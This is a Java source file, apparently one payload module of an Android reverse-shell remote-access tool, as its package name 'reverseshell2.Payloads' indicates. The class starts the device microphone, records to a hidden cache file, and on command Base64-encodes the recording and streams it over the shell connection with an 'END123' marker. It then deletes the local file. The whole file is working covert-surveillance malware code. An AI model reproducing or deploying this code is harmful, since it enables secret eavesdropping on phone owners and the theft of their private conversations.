package com.example.reverseshell2.Payloads;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;


public class audioManager {


    static String TAG = "audioManagerClass";

    Context context;
    static OutputStream outputStream;

    static File audiofile = null;
    MediaRecorder mRecorder = null;

    public audioManager(Context context) {
        this.context = context;
    }


    public void startRecording(OutputStream outputStream){

        this.outputStream = outputStream;

        try {
            File outputDir = context.getCacheDir();
            audiofile = File.createTempFile("sound", ".mpeg4", outputDir);
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            mRecorder = new MediaRecorder();
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mRecorder.setOutputFile(audiofile);
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            try {
                mRecorder.prepare();
                mRecorder.start();
                outputStream.write("Started Recording Audio\n".getBytes("UTF-8"));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        else {
            try {
                outputStream.write("Lower Android SDK Cant Record Audio\n".getBytes("UTF-8"));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }

    public void stopRecording(OutputStream out){
        this.outputStream = out;
        if(mRecorder!=null){
            try{
                mRecorder.stop();
            }catch (IllegalStateException e){
                try {
                    outputStream.write("Audio Service Not Started\n".getBytes("UTF-8"));
                    return;
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
            mRecorder.release();
            if(audiofile.length()!=0 && audiofile.exists()){
                sendData(audiofile);
            }else{
                try {
                    outputStream.write("Error in getting Audio Data\n".getBytes("UTF-8"));
                    return;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            audiofile.delete();
        }else{
            try {
                outputStream.write("Audio Service Not Started\n".getBytes("UTF-8"));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static void sendData(File file) {

        if(file.length()>16000000){
            try {
                outputStream.write("Large file cant transfer \nEND123\n".getBytes("UTF-8"));
            } catch (IOException e) {
                e.printStackTrace();
            }
            return;
        }
        try {
            outputStream.write("stopAudio\n".getBytes("UTF-8"));
        } catch (IOException e) {
            e.printStackTrace();
        }
        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);

            String encodedAudio = Base64.encodeToString(data, Base64.DEFAULT);
            outputStream.write(encodedAudio.getBytes("UTF-8"));
            outputStream.write("END123\n".getBytes("UTF-8"));
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
